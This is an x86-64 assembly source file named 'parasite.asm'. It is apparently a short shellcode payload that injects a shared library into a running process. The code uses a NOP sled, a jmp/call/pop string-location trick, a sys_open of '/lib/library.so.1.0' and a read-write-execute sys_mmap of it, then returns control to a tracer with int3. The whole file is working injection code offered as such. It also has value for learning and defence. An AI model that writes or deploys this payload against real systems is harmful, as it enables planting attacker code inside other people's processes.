; Assembly code that invokes the Linux sys_open and sys_mmap system calls in 
; order to inject the shared object into a processes address space.
;
; Author: Matthew Bobrowski
; Build:
;	nasm -f elf64 parasite.asm
;	ld -o parasite parasite.o
section .text
	; The _start symbol must be declared for the linker program (ld)
	global _start
_start:
	; Small nop-sled used as a safe-guard when diverting execution
	nop
	nop
	nop
	nop
	jmp short do_call
jmp_back:
	; Prepare arguments for the sys_open system call
	; - rdi: pointer to string
	; - rsi: file access mode (O_RDONLY)
	; - rax: system call number (sys_open)
	pop rdi
	xor rsi, rsi
	xor rax, rax
	mov al, 0x2
	
	; Execute the sys_open system call
	syscall

	; Prepare arguments for the sys_mmap system call
	; - rdi: starting address of mapped file (NULL, allow kernel to choose)
	; - rsi: length of bytes starting at offset (8192 bytes)
	; - rdx: protection of mapping (PROT_EXEC | PROT_READ | PROT_WRITE)
	; - r10: mapped memory visibility (MAP_PRIVATE)
	; - r8:  file descriptor returned by sys_open
	; - r9:  starting offset (0)
	; - rax: sys_mmap
	xor rdi, rdi
	xor rsi, rsi
	mov si,	0x2000 
	xor rdx, rdx
	mov dl, 0x7
	xor r10, r10
	mov r10b, 0x2
	xor r8, r8
	mov r8b, al
	xor r9, r9
	xor rax, rax
	mov al, 0x9

	; Execute the sys_mmap system call
	syscall
	
	; Signal (SIGTRAP) a breakpoint to the debugger to restore execution
	int3
do_call:
	call jmp_back
	library: db "/lib/library.so.1.0", 00
